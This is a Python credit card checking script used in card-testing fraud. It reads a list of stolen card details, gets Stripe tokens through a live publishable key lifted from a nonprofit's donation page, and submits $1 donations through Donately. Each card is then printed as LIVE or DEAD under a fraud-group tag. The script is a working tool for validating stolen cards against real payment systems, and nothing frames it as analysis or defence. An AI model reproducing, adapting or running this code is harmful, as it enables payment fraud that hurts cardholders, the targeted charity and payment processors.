import sys

import requests


class Checker():
    def __init__(self):
        try:
            cc_file = sys.argv[1]
        except IndexError:
            cc_file = input('File : ')
        self.creditcards = [x for x in open(cc_file).read().splitlines() if x]
        self.ip = requests.get('https://api.ipify.org?format=json').json()['ip']
        self.gate1()

    def gate1(self):
        for creditcard in self.creditcards:
            cc_num, cc_month, cc_year, cvc = creditcard.split('|')
            data_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'DNT': '1',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/v3/controller-d223d770b0acbba9ec5ac4658b071b18.html',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'
            }
            data = {
                'card[name]': 'Edwin Corwin',
                'card[address_line1]': '36A Stracke Fort, Poblacion',
                'card[address_line2]': '',
                'card[address_city]': 'Roxas',
                'card[address_state]': '03',
                'card[address_zip]': '5367',
                'card[address_country]': 'PH',
                'card[number]': cc_num,
                'card[cvc]': cvc,
                'card[exp_month]': cc_month,
                'card[exp_year]': cc_year[2:],
                'guid': '7add5974-35ae-4c0d-ad9f-fa57ac8f603b',
                'muid': 'e5de59fe-e8ac-4c33-8b6c-f8533141a327',
                'sid': 'df4a4e44-3b72-43c2-9330-76030860a9fe',
                'payment_user_agent': 'stripe.js/901bf2cc; stripe-js-v3/901bf2cc',
                'referrer': 'https://rhcollaborative.org/donate/',
                'key': 'pk_live_sd4VzXOpmDU8DIdWT77qHT1q',
                'pasted_fields': 'number'
            }
            token = requests.post('https://api.stripe.com/v1/tokens', data=data, headers=data_headers)
            data_headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'DNT': '1',
                'Origin': 'https://rhcollaborative.org',
                'Referer': 'https://rhcollaborative.org/donate/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'
            }
            data = {
                'donation_type': 'cc',
                'account_id': 'act_f5d15c354806',
                'campaign_id': '1818',
                'fundraiser_id': '0',
                'dont_send_receipt_email': 'false',
                'first_name': 'Shinji',
                'last_name': 'Hideaki',
                'email': 'leechtools@gmail.com',
                'amount_in_cents': '100',
                'recurring': 'false',
                'phone_number': '9562917842',
                'street_address': '36A Stracke Fort, Poblacion',
                'street_address_2': '',
                'city': 'Roxas',
                'state': '03',
                'zip_code': '5367',
                'country': 'PH',
                'comment': '',
                'on_behalf_of': '',
                'anonymous': 'false',
                'dump': '',
                'meta_data': '{}',
                'referrer_id': '',
                'stripe_token': token.json()['id'],
                'security': {
                    "address_line1_check": "unchecked",
                    "address_zip_check": "unchecked",
                    "cvc_check": "unchecked",
                    "card_id": token.json()['card']['id'],
                    "funding": "debit",
                    "country": "PH",
                    "client_ip": self.ip,
                    "livemode": 'true',
                    "type": "card"
                }
            }
            donate = requests.post('https://api.donately.com/v2/donations.json', data=data, headers=data_headers)
            if 'Your card was declined.' in donate.text:
                print('DEAD [FR4UDST3RS R3PUBL1C] => {}'.format(creditcard))
            else:
                print('LIVE [FR4UDST3RS R3PUBL1C] => {}'.format(creditcard))


if __name__ == '__main__':
    Checker()
